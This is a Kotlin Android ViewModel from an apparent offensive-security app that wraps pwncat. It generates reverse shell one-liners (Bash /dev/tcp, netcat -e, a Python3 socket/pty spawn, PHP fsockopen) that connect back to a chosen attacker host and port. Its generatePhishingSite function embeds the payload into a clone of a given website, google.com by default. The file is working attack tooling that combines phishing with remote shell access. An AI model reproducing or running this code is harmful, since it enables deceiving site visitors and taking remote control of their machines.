package com.hereliesaz.pwncatharsis.viewmodel

import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.hereliesaz.pwncatharsis.data.PwncatRepository
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.catch
import kotlinx.coroutines.launch

class ReverseShellViewModel : ViewModel() {
    private val repository = PwncatRepository()

    private val _uiState = MutableStateFlow(ReverseShellUiState())
    val uiState: StateFlow<ReverseShellUiState> = _uiState.asStateFlow()

    fun onLhostChanged(value: String) {
        _uiState.value = _uiState.value.copy(lhost = value)
    }

    fun onLportChanged(value: String) {
        _uiState.value = _uiState.value.copy(lport = value)
    }

    fun onShellTypeChanged(value: String) {
        _uiState.value = _uiState.value.copy(shellType = value)
    }

    fun onUrlToCloneChanged(value: String) {
        _uiState.value = _uiState.value.copy(urlToClone = value)
    }

    fun generatePhishingSite() {
        val currentState = _uiState.value
        val payload =
            generateShellCommand(currentState.lhost, currentState.lport, currentState.shellType)

        viewModelScope.launch {
            _uiState.value = currentState.copy(isLoading = true, snackbarMessage = null)
            repository.generatePhishingSite(currentState.urlToClone, payload)
                .catch {
                    _uiState.value = _uiState.value.copy(
                        isLoading = false,
                        snackbarMessage = "Error: ${it.message}"
                    )
                }
                .collect { resultPath ->
                    _uiState.value = _uiState.value.copy(
                        isLoading = false,
                        snackbarMessage = "Site kit generated at: $resultPath"
                    )
                }
        }
    }

    fun onSnackbarShown() {
        _uiState.value = _uiState.value.copy(snackbarMessage = null)
    }

    fun generateShellCommand(lhost: String, lport: String, type: String): String {
        return when (type) {
            "Bash TCP" -> "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
            "Netcat" -> "nc -e /bin/sh $lhost $lport"
            "Python3" -> "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
            "PHP" -> "php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
            else -> "Unsupported shell type."
        }
    }
}

data class ReverseShellUiState(
    val lhost: String = "10.0.0.1",
    val lport: String = "4444",
    val shellType: String = "Bash TCP",
    val urlToClone: String = "https://google.com",
    val isLoading: Boolean = false,
    val snackbarMessage: String? = null,
)